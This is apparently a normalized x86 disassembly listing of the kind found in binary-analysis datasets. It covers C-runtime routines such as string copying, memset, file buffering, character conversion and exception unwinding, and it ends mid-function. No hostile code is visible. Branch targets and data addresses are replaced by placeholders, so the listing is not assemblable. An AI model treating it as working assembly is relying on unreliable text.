push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404b19
add esp 0x14
mov [ ebp + 0x18 ] eax
test ebx ebx
je r-xdata
push esi
call edi
push 0x13
call sub_406d15
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_406d76
pop ecx
jmp r-xdata
mov eax [ ebp + 0x18 ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_404b19
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
cmp edi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov dl [ edi ]
cmp dl bl
jne r-xdata
mov eax [ ebp + 0x18 ]
cmp eax ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
jmp r-xdata
mov [ eax ] bx
mov esi [ ebp + 0x14 ]
cmp [ esi ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp ecx ebx
jne r-xdata
mov ebx [ rw-data ]
movzx ecx dl
test [ ebx + ecx * 2 + 0x1 ] 0x80
je r-xdata
mov [ esi + 0x1 ] dl
cmp [ rw-data ] 0x1
jle r-xdata
push 0x1
movzx cx dl
mov [ eax ] cx
xor ecx ecx
cmp [ ebp + 0x8 ] ecx
setne cl
push ecx
push [ ebp + 0x8 ]
push 0x1
push edi
push 0x9
push eax
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ esi ] ebx
xor ecx ecx
cmp [ ebp + 0x8 ] ebx
setne cl
push ecx
push [ ebp + 0x8 ]
push 0x2
push esi
push 0x9
push eax
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
jmp r-xdata
cmp ecx 0x1
jle r-xdata
mov [ esi ] dl
push 0xfffffffe
jmp r-xdata
mov [ esi ] ebx
call sub_406dfe
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
jne r-xdata
xor edx edx
cmp [ ebp + 0x8 ] edx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push edi
push 0x9
push eax
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
pop eax
jmp r-xdata
mov eax [ rw-data ]
jmp r-xdata
and [ esi ] 0x0
jmp r-xdata
sub_404c2c
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov [ ebp + 0xb ] al
lea eax [ ebp - 0x8 ]
and [ ebp - 0x8 ] 0x0
push 0x0
push eax
lea eax [ ebp + 0xb ]
push 0x1
push eax
lea eax [ ebp - 0x2 ]
push eax
call sub_404ab6
add esp 0x14
test eax eax
mov eax 0xffff
jl r-xdata
or ax 0xffff
leave
retn
leave
retn
movzx eax [ ebp - 0x2 ]
sub_404c6d
push esi
call sub_406f04
push [ rw-data ]
call sub_40725f
mov edx [ rw-data ]
pop ecx
mov ecx [ rw-data ]
mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
jae r-xdata
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
add [ rw-data ] 0x4
mov esi eax
push edx
call sub_40725f
add eax 0x10
push eax
push [ rw-data ]
call sub_406f30
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
xor esi esi
jmp r-xdata
call sub_406f0d
mov eax esi
pop esi
retn
sub_404cfd
push 0x80
call sub_40734d
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
push 0x18
call sub_40623d
mov eax [ rw-data ]
pop ecx
sub_404d2c
push esi
mov esi ecx
push 0x1b
mov [ esi ] r--data
call sub_406d15
mov esi [ esi + 0x4 ]
pop ecx
test esi esi
je r-xdata
push 0x1b
call sub_406d76
pop ecx
pop esi
retn
push esi
call sub_406a86
pop ecx
sub_404d71
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
je r-xdata
push esi
call sub_406342
push esi
call sub_404da2
push esi
mov edi eax
call sub_406394
add esp 0xc
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
sub_404da2
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x83
je r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
pop edi
pop esi
retn
push esi
call sub_40662f
push esi
mov edi eax
call sub_4075f4
push [ esi + 0x10 ]
call sub_407514
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_406a86
and [ esi + 0x1c ] 0x0
pop ecx
sub_404dee
push ebp
mov ebp esp
push esi
push [ ebp + 0x14 ]
call sub_406342
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404e1d
push [ ebp + 0x14 ]
mov esi eax
call sub_406394
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_404e1d
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
test edi edi
mov [ ebp + 0x8 ] eax
mov ebx edi
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_40761f
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx eax
mov edi ebx
jb r-xdata
mov eax edi
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp + 0x14 ] eax
test eax eax
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push esi
call sub_40662f
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_405ac0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x1
mov edi ebx
mov eax ebx
xor edx edx
div [ ebp + 0x14 ]
mov edi ebx
sub edi edx
jmp r-xdata
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] eax
sub ebx eax
cmp eax edi
jb r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi + 0x10 ]
call sub_407737
add esp 0xc
cmp eax 0xffffffff
je r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
sub_404f30
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_404fab
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_407927
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_40761f
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_404ffd
push esi
call sub_4082fe
mov esi eax
test esi esi
jne r-xdata
push edi
push esi
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
call sub_40818e
push esi
mov edi eax
call sub_406394
add esp 0x14
mov eax edi
pop edi
pop esi
retn
pop esi
retn
sub_405050
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov edi [ esp + 0x8 ]
push esi
test edi 0x3
push ebx
je r-xdata
mov eax [ edi ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add edi 0x4
test eax 0x81010100
je r-xdata
mov al [ edi ]
inc edi
test al al
je r-xdata
mov eax [ edi - 0x4 ]
test al al
je r-xdata
dec edi
jmp r-xdata
test edi 0x3
jne r-xdata
sub edi 0x4
test ah ah
je r-xdata
mov esi [ esp + 0x14 ]
test esi 0x3
jne r-xdata
mov dl [ esi ]
inc esi
test dl dl
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
sub edi 0x3
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
mov [ edi ] dl
inc edi
dec ecx
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
sub edi 0x2
jmp r-xdata
test eax 0xff000000
jne r-xdata
mov [ edi ] cl
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov ecx ebx
and ecx 0x3
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
test dh dh
je r-xdata
mov dl [ esi ]
inc esi
mov [ edi ] dl
inc edi
test dl dl
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edx 0xff0000
je r-xdata
pop ebx
pop esi
dec ecx
jne r-xdata
mov [ edi ] dx
xor edx edx
mov eax [ esp + 0x10 ]
mov [ edi + 0x2 ] dl
pop ebx
pop esi
pop edi
retn
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
sub_405180
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_4052a0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_405360
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_4053c0
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_4053d0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_4054b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_4054f2
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_405541
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4083c6
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_405577
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_4055cb
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_408be0
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_4055cb
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_4083c6
add esp 0x20
pop ebp
retn
sub_4055f0
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_4056a6
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_408c93
call [ eax + 0x68 ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_4056a6
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_4083c6
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4054f2
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40571b
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_408d5b
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_408d5b
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_405798
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4057da
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_4057b8
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40586e
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_4058a7
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
leave
retn 0x8
sub_4058e1
push ebp
mov ebp esp
push esi
push [ ebp + 0x14 ]
call sub_406342
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405910
push [ ebp + 0x14 ]
mov esi eax
call sub_406394
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_405910
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
test edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp + 0x8 ] ecx
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
jmp r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ esi + 0xc ] 0x10c
je r-xdata
cmp ecx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_408e15
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp [ ebp + 0x14 ] 0x0
mov eax ecx
je r-xdata
cmp ecx eax
mov edi ecx
jb r-xdata
mov eax edi
xor edx edx
sub eax [ ebp + 0x8 ]
div [ ebp + 0xc ]
jmp r-xdata
mov [ ebx ] al
mov eax [ esi + 0x18 ]
inc ebx
dec [ ebp + 0x8 ]
mov [ ebp + 0x14 ] eax
push eax
push ebx
push [ esi + 0x10 ]
call sub_408ef1
add esp 0xc
test eax eax
je r-xdata
xor edx edx
div [ ebp + 0x14 ]
mov eax ecx
sub eax edx
push edi
push [ esi ]
push ebx
call sub_405ac0
sub [ ebp + 0x8 ] edi
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
add ebx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov edi eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
or [ esi + 0xc ] 0x20
sub [ ebp + 0x8 ] eax
add ebx eax
jmp r-xdata
sub_4059f8
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call sub_406342
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405a24
push [ ebp + 0x8 ]
mov esi eax
call sub_406394
add esp 0x14
mov eax esi
pop esi
pop ebp
retn
sub_405a24
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_406dfe
mov [ eax ] 0x16
or eax 0xffffffff
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
and al 0xef
cmp edi 0x1
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_40662f
mov eax [ esi + 0xc ]
pop ecx
test al 0x80
je r-xdata
push esi
call sub_409207
add [ esp + 0x14 ] eax
pop ecx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and al 0xfc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ esp + 0x14 ]
push [ esi + 0x10 ]
call sub_40912f
add esp 0xc
xor ecx ecx
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
jmp r-xdata
test al 0x8
je r-xdata
pop edi
pop esi
retn
test ah 0x4
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_405ac0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
